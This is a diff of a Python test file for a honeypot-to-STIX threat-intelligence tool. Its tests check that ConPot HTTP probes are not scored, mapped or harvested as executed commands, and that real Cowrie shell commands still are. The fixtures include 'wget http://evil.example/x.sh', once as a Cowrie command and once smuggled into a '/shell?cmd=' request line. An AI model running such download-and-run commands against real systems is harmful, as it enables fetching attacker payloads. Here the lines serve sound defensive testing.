@@ -37,15 +37,47 @@ def test_a_received_request_is_not_recorded_as_a_command():
     )
 
 
-def test_a_conpot_probe_no_longer_escapes_the_bare_scan_gate():
-    """`_is_bare_scan()` exists to keep drive-by probes at observable-only.
-    Every ConPot probe escaped it by carrying a fake command, then collected
-    +25 score and prose claiming shell activity."""
-    from tpot2cti.main import _is_bare_scan
+def test_a_received_request_no_longer_inflates_the_score():
+    """The central claim of this fix, and the one with real downstream
+    reach: `_signal_score` gave +25 for "commands", so every ConPot probe
+    scored 75 instead of 50. Scores ratchet UP across cycles (the
+    publisher's cross-cycle merge keeps max(score)), so an inflated score
+    can never be walked back once published."""
+    from tpot2cti.stix.builder import _signal_score
     s = _session([_doc()])[0]
-    assert _is_bare_scan(s), (
-        "a single ConPot HTTP probe is still being treated as substantive "
-        "interaction rather than a drive-by"
+    assert s.commands == []
+    assert _signal_score(s) == 50, (
+        "a received HTTP request is still being scored as executed commands"
+    )
+
+
+def test_a_received_request_does_not_map_to_command_execution():
+    """T1059 is "Command and Scripting Interpreter". Nothing was
+    interpreted — the sensor received bytes."""
+    from tpot2cti.attack_mapping import techniques_for_session
+    s = _session([_doc()])[0]
+    techniques = techniques_for_session(s)
+    assert not any("T1059" in str(t) for t in techniques), (
+        f"a received request still maps to command execution: {techniques}"
+    )
+
+
+def test_no_urls_or_domains_are_harvested_from_a_request_line():
+    """`_CMD_URL_RE` ran over `session.commands` and minted a URL AND a
+    Domain-Name for every http:// substring, asserting "Payload URL fetched
+    via ConPot". A URL in a request the attacker SENT US is not a URL the
+    attacker FETCHED — it is, at most, a proxy target."""
+    doc = _doc(request="GET /shell?cmd=wget+http://evil.example/x.sh HTTP/1.1\r\n")
+    s = _session([doc])[0]
+    from tpot2cti.config import load_config
+    import os
+    builder_cfg = load_config(dict(os.environ))
+    from tpot2cti.stix.builder import STIXBuilder
+    objs = STIXBuilder(builder_cfg).build_conpot_session(s)
+    minted = [o for o in objs if o["type"] in ("url", "domain-name")]
+    assert not minted, (
+        f"observables harvested from a received request line: "
+        f"{[o.get('value') for o in minted]}"
     )
 
 
@@ -64,12 +96,31 @@ def test_the_blob_is_still_preserved_as_evidence(builder, cfg):
 
 
 def test_genuine_shell_commands_are_untouched():
-    """The fix must not weaken real command capture from shell honeypots."""
-    from datetime import datetime, timezone
-    now = datetime(2026, 8, 5, tzinfo=timezone.utc)
-    s = AttackSession(
-        src_ip="198.51.100.21", session_id="x", sensor_hostname="sensor01",
-        event_type="Cowrie", first_seen=now, last_seen=now,
+    """The positive control. Without it every assertion above passes
+    vacuously the moment command capture breaks entirely.
+
+    This must drive a REAL parser — an earlier version hand-built an
+    AttackSession, appended to `.commands` and asserted `.commands` was
+    non-empty, which is a tautology that cannot fail."""
+    from tpot2cti.parsers.cowrie import CowrieParser
+    from tpot2cti.stix.builder import _signal_score
+
+    p = CowrieParser()
+    docs = [{
+        "type": "Cowrie", "src_ip": "198.51.100.21", "dest_ip": "192.0.2.3",
+        "dest_port": 2222, "@timestamp": "2026-08-05T00:00:00.000Z",
+        "t-pot_hostname": "sensor01", "eventid": "cowrie.command.input",
+        "session": "abc123", "input": "wget http://evil.example/x.sh",
+        "id": "c1",
+    }]
+    events = [e for e in (p.parse(d) for d in docs) if e is not None]
+    assert events, "the Cowrie fixture stopped parsing — fix the fixture"
+    sessions = p.correlate(events)
+    s = sessions[0]
+
+    assert s.commands == ["wget http://evil.example/x.sh"], (
+        "real shell-command capture regressed"
     )
-    s.commands.append("wget http://evil.example/x.sh")
-    assert s.commands and not s.protocol_requests
+    assert not s.protocol_requests, "a shell command leaked into protocol_requests"
+    # And the substance signal a real command SHOULD carry.
+    assert _signal_score(s) > 50, "genuine commands no longer score as substance"
